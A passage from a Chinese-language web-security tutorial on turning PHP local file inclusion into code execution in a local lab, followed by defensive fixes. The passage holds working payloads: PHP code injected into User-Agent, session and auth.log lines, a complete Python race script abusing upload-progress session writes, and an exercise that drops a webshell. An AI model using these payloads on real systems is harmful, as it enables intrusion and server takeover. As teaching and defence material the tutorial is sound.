配套的场景是"任意文件上传 + 包含"：站点允许传 zip 压缩包但拦一切 `.php` 文件名，把小马压进 zip 传上去，`zip://` 精确指到包内的 `shell.php`——==条目名不在文件系统的文件名里，后缀过滤形同虚设==。

> [!info]- phar:// 与反序列化的关系
> `phar://` 读 phar 包（PHP 自己的归档格式，`phar:///path/to.phar/inner.php`），同样不吃 allow_url_include。phar 包除了文件区还有一段元数据区，存的是序列化的 PHP 对象；PHP 的许多文件操作函数（`file_exists`、`fopen`、`is_dir`……）碰到 phar 流时会自动反序列化这段元数据——攻击者构造恶意元数据 + 站点存在可用的类方法链（POP 链），不需要 include，一次 `file_exists('phar://…')` 就能触发代码执行。这条线属于反序列化漏洞的入口，本章不展开，[[W12-PHP反序列化|W12]] 的 phar 反序列化一节专门讲；打包含题时记得 phar:// 这个前缀的存在即可。

## 5. 日志注入

1.2 节的结论：==内容可控的文件被包含，就是代码执行==。日志是最常见的这类文件——web 服务器把请求行、User-Agent、Referer 原样写进访问日志，而这些都是请求方可控的。真实场景里路径是 `/var/log/apache2/access.log`、`/var/log/nginx/access.log` 一类，日志的属主通常就是服务运行用户，可读性良好。php -S 内置服务器的请求日志走 stderr，不落盘（6.3 节会用 `/proc/self/fd/2` 让你看到这份日志的内容），所以本章靶子用 `file_put_contents` 把 UA 写进 `logs/access.log`，模拟 access.log 的形态——index.php 里那三行日志代码（[[#2.1 目录与代码|2.1]]）就是干这个的。

打靶三步：正常访问看日志形态、UA 带代码再访问、包含日志文件。

第一步，普通 UA：

```bash
curl -s --noproxy '*' -A 'phone-browser/1.0' 'http://127.0.0.1:8600/?page=pages/home'
cat logs/access.log
```

输出：

```
<h1>W06 home</h1>
```

```
[12:02:06] 127.0.0.1 "/?page=pages/home" "phone-browser/1.0"
```

日志一行一条：时间、来源 IP、请求行、UA。第二步，UA 换成 PHP 代码：

```bash
curl -s --noproxy '*' -A '<?php system("id");?>' 'http://127.0.0.1:8600/?page=pages/home'
cat logs/access.log
```

输出：

```
<h1>W06 home</h1>
```

```
[12:02:06] 127.0.0.1 "/?page=pages/home" "phone-browser/1.0"
[12:02:06] 127.0.0.1 "/?page=pages/home" "<?php system("id");?>"
```

UA 原样落盘，`<?php system("id");?>` 完整躺在第二行里（UA 里的双引号破坏了日志外层的引号包裹，但执行只认 `<?php` 标签，包裹结构无关紧要）。第三步，包含日志：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=logs/access.log'
```

输出：

```
[12:02:06] 127.0.0.1 "/?page=pages/home" "phone-browser/1.0"
[12:02:06] 127.0.0.1 "/?page=pages/home" "uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
"
```

第一行是旧日志，标签外原样输出；第二行里 `<?php system("id");?>` 被执行，`id` 的输出顶替了原 UA 的位置。==日志注入的全部前提只有两个：知道日志路径、有 LFI 入口==，所以真实渗透里"先摸清 web 服务器指纹与日志路径"是包含题的标准前置。

> [!note] 写入后先看日志原文
> payload 打进 UA 后先 `cat` 一眼日志：确认 `<?php … ?>` 完整落盘再包含。有些服务器或中间层会截断超长 UA、过滤尖括号或转义引号，写不进去的 payload 包含一万次也不会执行。日志文件很大时，包含它会把整份历史原样吐一遍，payload 写在最后一条，翻到输出末尾看结果即可。

> [!info]- 两个历史场景
> **/proc/self/environ**：进程的环境变量文件，CGI/FastCGI 部署下请求头常被塞进环境变量（如 HTTP_USER_AGENT），把代码塞进头再包含这个文件即可执行；php -S 下多数变量不进 environ，这条路更多是读老题解时的背景知识。**ssh auth.log**：SSH 登录失败时，用户名原样写进 `/var/log/auth.log`——`ssh '<?php system("id");?>'@target` 之后包含 auth.log 即执行；前提是目标开 SSH 且日志对 web 用户可读，比日志注入多一层依赖，作为同类思路了解即可。

## 6. session 文件与 /proc

### 6.1 session 文件包含

[[W01-Web安全导论与HTTP深化|W01]] 讲过 session 的分工：数据存服务端，cookie 只带编号。存数据的方式由存储器决定，默认存储器是**文件**——session 数据以序列化形态落在磁盘上，路径与文件名有规律：

- 路径：`session.save_path` 指定。Ubuntu 发行版的 php.ini 把它设为 `/var/lib/php/sessions`（`php -i` 的输出见 6.2 节开头）；未设置（空值）时落到系统临时目录，Linux 上是 `/tmp`；
- 文件名：`sess_<PHPSESSID>`，ID 就是你 cookie 里那个值。

```bash
php -r 'var_dump(ini_get("session.use_strict_mode"));'
```

输出：

```
string(1) "0"
```

`use_strict_mode` 默认关闭意味着客户端自带一个不存在的 session ID 也会被接受——攻击者可以==自己定 ID==，session 文件路径完全可知。

靶子把 `$_GET['user']` 原样写进 `$_SESSION['username']`（登录名直接进 session 是常见写法）。先正常走一遍：

```bash
curl -s --noproxy '*' -c /tmp/w06jar -G 'http://127.0.0.1:8600/index.php' --data-urlencode 'page=pages/home' --data-urlencode 'user=guest'
SID=$(awk '$6=="PHPSESSID"{print $7}' /tmp/w06jar)
cat /tmp/w06jar
echo SID=$SID
```

输出：

```
<h1>W06 home</h1>
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

127.0.0.1	FALSE	/	FALSE	0	PHPSESSID	727b383134df95e8cff292a54b661902
SID=727b383134df95e8cff292a54b661902
```

`-c` 把服务端发下的 PHPSESSID 存进 cookie 罐。看 session 文件：

```bash
ls -l /var/lib/php/sessions/
cat "/var/lib/php/sessions/sess_$SID"
```

输出：

```
ls: cannot open directory '/var/lib/php/sessions/': Permission denied
```

```
username|s:5:"guest";
```

`ls` 被拒但按名直读成功——这不是矛盾：Ubuntu 给 sessions 目录的权限位是 `1733`（其他用户有写和进入权限、没有列目录权限），==目录列不了、知道了文件名照样能读==。文件内容是 session 的序列化格式：`键名|类型:长度:"值";`。把代码写进去：

```bash
curl -s --noproxy '*' -b /tmp/w06jar -G 'http://127.0.0.1:8600/index.php' --data-urlencode 'page=pages/home' --data-urlencode 'user=<?php system("id");?>'
cat "/var/lib/php/sessions/sess_$SID"
```

输出：

```
<h1>W06 home</h1>
```

```
username|s:21:"<?php system("id");?>";
```

`s:21` 就是这段 PHP 代码。包含它：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8600/inc.php?file=/var/lib/php/sessions/sess_$SID"
```

输出：

```
username|s:21:"uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
";
```

`username` 键的值被执行，输出嵌在序列化格式中间。汇总 session 路线的前提：==默认 files 存储器、知道 save_path、知道或能自定 session ID==（save_path 常从 phpinfo 泄露渠道拿到，见 [[W03-信息泄露与前端安全|W03]]）。应用把任何用户可控的值写进 session，这条路线就成立。

### 6.2 PHP_SESSION_UPLOAD_PROGRESS：竞态写 session

6.1 的路线依赖"应用把可控值写 session"。有一个机制不依赖应用配合：**上传进度**。multipart 上传进行中，PHP 会把进度写进该请求 cookie 指定 sid 的 session 文件，写入的键名是 `前缀 + 表单字段值`——而表单字段名默认就叫 `PHP_SESSION_UPLOAD_PROGRESS`，字段**值**攻击者完全可控。相关 ini 的默认值：

```bash
php -i | grep -E "^session.upload_progress|^session.save_path"
```

输出：

```
session.save_path => /var/lib/php/sessions => /var/lib/php/sessions
session.upload_progress.cleanup => On => On
session.upload_progress.enabled => On => On
session.upload_progress.freq => 1% => 1%
session.upload_progress.min_freq => 1 => 1
session.upload_progress.name => PHP_SESSION_UPLOAD_PROGRESS => PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.prefix => upload_progress_ => upload_progress_
```

功能默认开（`enabled=On`）。键名所以是 `upload_progress_<字段值>`——==字段值原样进键名，键名原样落文件==，把字段值写成 PHP 代码，代码就进了 session 文件。麻烦在 `cleanup=On`：请求结束时进度数据被清空，代码只在**上传进行中**存在于文件里——窗口期就是上传时长，必须竞态。另一个数 `min_freq=1`：进度至多每秒更新一次，==上传快于 1 秒时可能一次进度都没写盘==，这是这条路线"打了没反应"的第一查因。

竞态脚本：一个线程用原生 socket 慢速上传（7MB 分块发、每块停 0.5 秒，把窗口拖到秒级），三个线程循环包含 session 文件，谁读到执行结果谁收工：

```python
# race_up.py —— PHP_SESSION_UPLOAD_PROGRESS 竞态：慢速上传把 payload 写进 session 文件，
#               并发包含该文件，抢在请求结束的自动清理之前执行
# 服务端：PHP_CLI_SERVER_WORKERS=8 php -S 127.0.0.1:8600 -d allow_url_include=1
import socket
import threading
import time

import requests

BASE = 'http://127.0.0.1:8600'
HOST, PORT = '127.0.0.1', 8600
SID = 'w06race066'                       # use_strict_mode 默认关，自选 sid 也接受
SESS = '/var/lib/php/sessions/sess_' + SID
PAYLOAD = b'<?php system("id");?>'
CHUNK = b'A' * (1024 * 1024)             # 上传体 7MB：小于 post_max_size 默认的 8M
BOUND = '----w06race'

def uploader():
    part1 = (
        f'--{BOUND}\r\n'
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    ).encode() + PAYLOAD + (
        f'\r\n--{BOUND}\r\n'
        f'Content-Disposition: form-data; name="f"; filename="big.bin"\r\n'
        f'Content-Type: application/octet-stream\r\n\r\n'
    ).encode()
    tail = f'\r\n--{BOUND}--\r\n'.encode()
    head = (
        f'POST /dummy.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n'
        f'Cookie: PHPSESSID={SID}\r\n'
        f'Content-Type: multipart/form-data; boundary={BOUND}\r\n'
        f'Content-Length: {len(part1) + len(CHUNK) * 7 + len(tail)}\r\n'
        f'Connection: close\r\n\r\n'
    ).encode()
    sk = socket.create_connection((HOST, PORT), timeout=30)
    sk.sendall(head + part1)
    for _ in range(7):                   # 每块 1MB 停 0.5s：7MB 拖到 3.5s，竞态窗口拉到秒级
        sk.sendall(CHUNK)
        time.sleep(0.5)
    sk.sendall(tail)
    sk.close()

stop = threading.Event()

def includer():
    s = requests.Session()
    s.trust_env = False                  # 不走系统代理，等价 curl 的 --noproxy '*'
    while not stop.is_set():
        try:
            r = s.get(BASE + '/inc.php', params={'file': SESS}, timeout=5)
        except requests.RequestException:
            continue
        if 'uid=' in r.text:
            print('== race hit ==')
            print(r.text[:120])
            stop.set()

threads = [threading.Thread(target=uploader)]
threads += [threading.Thread(target=includer) for _ in range(3)]
for t in threads:
    t.start()
for t in threads:
    t.join(timeout=60)
stop.set()
```

几个要点：上传目的地是 `dummy.php`（惰性端点，不抢 session、不写日志）；`PHP_SESSION_UPLOAD_PROGRESS` 字段排在文件字段**前面**，multipart 解析要先见到它才启用进度；包含请求打向 `inc.php`，目标路径由自选的 SID 算出，不需要抢 cookie。服务端要多进程起——php -S 默认单进程，上传请求会占住唯一的 worker，包含请求全部排队等到上传结束才被处理，竞态必输：

```bash
PHP_CLI_SERVER_WORKERS=8 php -S 127.0.0.1:8600 -d display_errors=1 -d allow_url_include=1
```

跑脚本：

```bash
python3 race_up.py
```

输出：

```
== race hit ==
upload_progress_uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),10
== race hit ==
upload_progress_uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),10
```

`race hit` 行不止一条：三个包含线程都赶上了窗口，第一个命中置停标志后，其余在途请求照样把结果带回来了。上传结束后再看文件，确认清理发生过：

```bash
wc -c /var/lib/php/sessions/sess_w06race066
```

输出：

```
0 /var/lib/php/sessions/sess_w06race066
```

文件被清空——窗口确实只存在于上传期间。

> [!info]- cleanup=0 时窗口在请求结束后仍在
> 部分配置（或老版本行为讨论）里 `session.upload_progress.cleanup=Off`，进度数据不在请求结束时清除。靶的启动命令加一个 `-d`：
>
> ```bash
> PHP_CLI_SERVER_WORKERS=8 php -S 127.0.0.1:8600 -d display_errors=1 -d allow_url_include=1 -d session.upload_progress.cleanup=0
> ```
>
> 同样的竞态脚本跑完后，session 文件内容保留——先看：
>
> ```bash
> cat /var/lib/php/sessions/sess_w06race066
> ```
>
> 输出（键名带着 payload，后跟进度元数据，`done` 已置 1）：
>
> ```
> upload_progress_<?php system("id");?>|a:5:{s:10:"start_time";i:1792757818;s:14:"content_length";i:7340278;s:15:"bytes_processed";i:2104137;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:
> ```
>
> 此时不需要抢窗口，随时包含：
>
> ```bash
> curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=/var/lib/php/sessions/sess_w06race066'
> ```
>
> 输出：
>
> ```
> upload_progress_uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
> |a:5:{s:10:"start_time";i:1792757818;s:14:"content_length";i:7340278;
> ```
>
> cleanup=1 与 =0 的差别就是"要不要竞态"：默认配置练竞态，遇到 cleanup=0 的靶直接两步走。

### 6.3 /proc 文件系统

Linux 的 `/proc` 把内核态信息挂成文件，`/proc/self/` 是"打开它的那个进程自己"——对包含漏洞来说就是 PHP 进程本身。两个最常用的：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=/proc/self/cmdline' | tr "\0" " "
```

输出：

```
php -S 127.0.0.1:8600 -t /home/hua/labs/w06 -d display_errors=1 -d allow_url_include=1
```

`cmdline` 是进程启动命令行，字节间以 `\0` 分隔（`tr` 换成空格好看些）——==打靶第一步包含它，靶的启动参数（allow_url_include 开没开、Web 根在哪）一目了然==。再看 `fd/2`：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=/proc/self/fd/2' | tail -4
```

输出：

```
[Fri Oct 23 20:02:12 2026] 127.0.0.1:44784 Accepted
[Fri Oct 23 20:02:12 2026] 127.0.0.1:44784 [200]: GET /inc.php?file=/proc/self/cmdline
[Fri Oct 23 20:02:12 2026] 127.0.0.1:44784 Closing
[Fri Oct 23 20:02:12 2026] 127.0.0.1:44788 Accepted
```

`fd/N` 是进程打开的文件描述符：0、1、2 是标准输入、输出、错误。php -S 的请求日志正写在 stderr 上——第 5 节说的"内置服务器日志走 stderr、不落盘"，这里是它的内容本身。这条路的直接价值：日志内容进了 stderr 这个"文件"，==包含 `/proc/self/fd/2` 就等于包含 php -S 的访问日志==，第 5 节的 UA 注入对它同样成立。其余 `fd/N` 指向进程打开中的各种文件（连着的 socket、上传中的临时文件），值得逐个翻。

## 7. LFI 到 RCE 的路线汇总

把前面的路线收进一张表。第一列是入口，第二列是该路线的依赖条件，打靶时按条件对照选路：

| 路线 | 依赖条件 | 一句话 |
| ---- | ---- | ---- |
| `php://input` | `allow_url_include=1` | POST 体即代码，payload 不落盘 |
| `data://` | `allow_url_include=1` | payload 全在 URL 里，无尾缀靶直用 |
| RFI（`http://`） | 两个开关全开 | payload 放自己的 HTTP 服务 |
| 日志注入 | 知道日志路径且可读 | UA / 请求行带代码，包含日志文件 |
| session | files 存储器 + 知道 save_path 与 sid | 应用把可控值写 session；或 6.2 的上传进度竞态 |
| `zip://` | 一个任意文件上传点 | 包内条目名精确补成 `.php`，绕尾缀与后缀过滤 |
| 已知可写文件 | 文件名与内容可控（上传、缓存、临时文件） | 无尾缀靶直接吃任何后缀 |
| `php://filter` 读源码 | 无 | 不拿 RCE，拿信息：读出源码找硬编码 flag、二阶注入点（[[W04-SQL注入\|W04]]）或下一条路线的路径 |

选路顺序上 filter 读源码永远值得先打：它没有任何开关前提，读出来的源码直接告诉你其余路线哪些走得通（有没有写文件的点、session 怎么用、日志在哪），==先读源码再选执行路线==是包含题的固定开局。

## 8. 防御

### 8.1 白名单固定映射

lab 里的 safe.php。页面路由的本质是"几个固定页面之间切换"，那就让输入只当**键**用，路径全部写在服务端：

```php
<?php
// safe.php —— 防御一：白名单固定映射，page 只能是映射表里的键
$map = [
    'home'  => 'pages/home.php',
    'about' => 'pages/about.php',
];
$page = $_GET['page'] ?? 'home';
if (!isset($map[$page])) {
    http_response_code(404);
    exit("page not found\n");
}
include($map[$page]);
```

```bash
cd ~/labs/w06
php -S 127.0.0.1:8602 -d display_errors=1
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe.php?page=home'
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe.php?page=about'
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe.php?page=../../../../etc/passwd'
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe.php?page=php://filter/read=convert.base64-encode/resource=index'
```

输出：

```
<h1>W06 home</h1>
```

```
<h1>about this lab</h1>
<p>build: w06-lab</p>
```

```
page not found
```

```
page not found
```

映射表里没有的键一律 404：遍历、伪协议、任何形式的不认——==路径根本不再是输入，攻击面从根上取消==。这是页面路由的首选方案，与 [[W05-命令注入与代码执行|W05]] 的白名单校验同一思想。

### 8.2 basename + realpath + 目录前缀

必须让用户参与选文件时（如按名加载模板），三步把输入关进目录：

```php
<?php
// safe2.php —— 防御二：basename 剥目录 + realpath 解析 + 目录前缀比对
$base = __DIR__ . '/pages/';
$name = basename($_GET['page'] ?? 'home.php');
$real = realpath($base . $name);
if ($real === false || !str_starts_with($real, $base) || !str_ends_with($real, '.php')) {
    http_response_code(400);
    exit("bad page\n");
}
include($real);
```

三步各自的分工：`basename` 剥掉输入里的目录部分，`../` 与伪协议的斜杠结构一起被剥掉；`realpath` 把剩余名字接在固定目录后解析成规范绝对路径，路径不存在（或指向碎链）时返回 `false`；`str_starts_with` 确认解析结果仍在 `pages/` 里（防软链接与符号跳转），`str_ends_with` 锁死扩展名。对照着打：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe2.php?page=about.php'
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe2.php?page=../../../../etc/passwd'
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe2.php?page=../inc.php'
curl -s --noproxy '*' 'http://127.0.0.1:8602/safe2.php?page=php://filter/read=convert.base64-encode/resource=index'
curl -s --noproxy '*' -G 'http://127.0.0.1:8602/safe2.php' --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+'
```

输出：

```
<h1>about this lab</h1>
<p>build: w06-lab</p>
```

```
bad page
```

```
bad page
```

```
bad page
```

```
bad page
```

四种输入全部拦下：遍历被 basename + 前缀校验剥掉，伪协议在 basename 与 realpath 两道都过不去（都不是 pages/ 下真实存在的 `.php` 文件）。注意它不拦"pages/ 目录内的其他 .php"——前缀校验防的是跳出目录，目录内出现不该被包含的文件要靠目录内容管理。

### 8.3 关开关、关报错

配置层的两件事：

- **`allow_url_include` 保持默认 Off**。第 4 节的对照已经给出它的管辖范围：`php://input`、`data://`、`http://` RFI、filter 套远程协议在 include 语境下全部失效。它管不到本地路径，所以==关开关挡住远程一半，白名单与路径校验挡住本地一半，两件事各自管一半、缺一不可==；
- **生产环境关 `display_errors`**。本章的 payload 诊断大量依赖 Warning 回显（回显完整路径、失败原因）；关掉它，攻击者每次失败只看到空白，探测成本显著上升。

配套的组织措施：上传目录与代码目录分离、上传目录不给执行权限（掐掉 zip:// 与"已知可写文件"两条路线的落点）；日志、session 的落盘路径不与 Web 根重叠，且不把 phpinfo 类页面留在可达路径上（save_path、日志路径多半从那里漏出去）。

## 9. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| filter 拿到一长串字母数字，看不出内容 | base64 编码还没解：管道接 `base64 -d`；rot13 用 `tr 'A-Za-z' 'N-ZA-Mn-za-m'` 还原（[[#4.2 php://filter：读源码与过滤器管道\|4.2]]） |
| `php://input` 打过去只有 Warning `operation failed` | 服务器没开 `allow_url_include`：`php -S` 启动命令加 `-d allow_url_include=1` 重启（[[#4.3 php://input：POST 体即代码\|4.3]]） |
| `data://` 报 `rfc2397: unable to decode` | 尾缀拼坏了 base64：改用裸文本形态 `data://text/plain,<?php … ?>`，让尾缀落在 `?>` 之后（[[#3.3 尾缀靶的绕法\|3.3]]） |
| 尾缀靶上所有 payload 都失效 | 输入已被拼成"前缀.php"：按绕法三的成败表换写法——zip 条目名补齐、data 裸文本、RFI 加 `?`（[[#3.3 尾缀靶的绕法\|3.3]]） |
| session 文件"找不到" | save_path 目录带 `1733` 权限位，`ls` 被拒但按 `sess_<sid>` 全名直读可以；save_path 为空时文件在系统临时目录（[[#6.1 session 文件包含\|6.1]]） |
| 竞态总是 miss | 单 worker 的 php -S 让包含请求排队到上传结束：`PHP_CLI_SERVER_WORKERS=8` 多进程起；上传不足 1 秒时进度一次都不落盘（`min_freq=1`）：再拖慢上传（[[#6.2 PHP_SESSION_UPLOAD_PROGRESS：竞态写 session\|6.2]]） |
| `zip://` 打不开 | `#` 没写成 `%23`；压缩包没用绝对路径；包内条目名拼错（[[#4.7 zip:// 与 phar://：包内条目也是文件\|4.7]]） |
| Warning 写着 `http:// wrapper is disabled … by allow_url_include=0` | 包含远程被默认配置挡住：自建靶加 `-d` 打通；真实靶上记录现象、换本地路线（[[#4.6 http:// 与 RFI：两个开关缺一不可\|4.6]]） |
| 日志包含后没有执行结果 | 先 cat 日志原文确认 `<?php … ?>` 完整落盘：超长 UA 可能被中间层截断、尖括号可能被过滤（[[#5. 日志注入\|5]]） |
| 包含 `/proc/self/environ` 拿到的是空内容 | 环境变量进 environ 是 CGI/FastCGI 部署的行为，php -S 下多数为空：换 `/proc/self/cmdline`、`/proc/self/fd/N`（[[#6.3 /proc 文件系统\|6.3]]） |
| Windows 靶上 `../` 找不到文件 | Windows 路径按 `\` 解析更稳：`..\..\`；include 两种分隔符都认，先试 `..\` 再试 `/` |
| 读源码读出来的是二进制乱码 | 目标可能本来就是图片或压缩数据：确认 resource 指向的是文本源码文件，别把上传目录里的图当源码解 |

## 10. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **DVWA**（[[01-练习平台索引|01 章]]收录获取方式）File Inclusion 关卡从 Low 打到 High：Low 复现本章第 3、4 节的遍历与 filter 读源码；High 观察它的过滤写法，回到第 3.3 节的成败表找对应绕法。
> 2. **CTFshow Web 入门**的文件包含分区：每题先按第 7 节的路线表对照"靶面给了什么条件"，再动手，练的是选路而不是 payload 背诵。

配套练习：

1. 给主靶 index.php 加一层 `str_replace('../', '', $page)` 过滤，用 `....//` 构造绕过并解释原因（替换后的串重新组合出 `../`）；再把替换改成循环替换到不再出现为止，确认递归替换是否堵死，想一个仍能绕的写法或说明为什么堵死了。
2. 在 6.2 的靶上把 `race_up.py` 的 PAYLOAD 换成写文件型代码（`file_put_contents('pwned.php', '<?php system($_GET["c"]);?>');`），竞态命中后用 `?c=id` 交互——对比"包含即执行"与"落地 webshell"两种落地形态的差别。
3. 用 `php://filter` 管道把 inc.php 源码先 `string.rot13` 再 `convert.base64-encode`，把输出本地两步还原，写清楚还原顺序为什么与管道顺序相反（[[#4.2 php://filter：读源码与过滤器管道|4.2]]）。
4. 把 safe2.php 的 `str_ends_with($real, '.php')` 去掉后重打 [[#3.3 尾缀靶的绕法|3.3]] 的全部输入，找出仍然拦得住与开始放行的各有哪些，用结果说明这一句扩展名检查多防住了什么。
5. 把 `race_up.py` 的包含线程从 3 个加到 8 个、上传分块从 1MB 改成 4MB，记录命中所需时间的变化，给"窗口期 × 包含频率"的关系一个自己的结论。

延伸阅读：

- PHP 手册"支持的协议和封装协议"（Wrappers）各页：每个协议对 `allow_url_fopen` / `allow_url_include` 的依赖一栏是权威出处，本章 4.1 节总表的原始依据；
- PHP 手册 `session.upload_progress.*` 配置项页：进度写入的完整键名规则与各默认值的原始出处；
- PayloadsAllTheThings 仓库的 File Inclusion 篇：绕过写法与 LFI2RCE 路线的百科式索引，本章第 7 节的每条路线都能在那里找到更多变体；
- synacktiv 的 php_filter_chain_generator：当 `allow_url_include=0` 且只剩 filter 可用时，把大量转换过滤器串成管道"造"出任意内容，使"只能读"升级为"能执行"——当代 CTF 包含题的高频进阶路，读通本章 4.2 的过滤器管道后上手；
- 复盘对照：[[W05-命令注入与代码执行|W05]] 的命令执行与本章的文件包含是输入抵达危险函数的两条主干道——W05 的过滤与绕过（空格、分隔符、黑名单）与本章的尾缀、开关、落点写作同构，放在一起复盘收益最高。
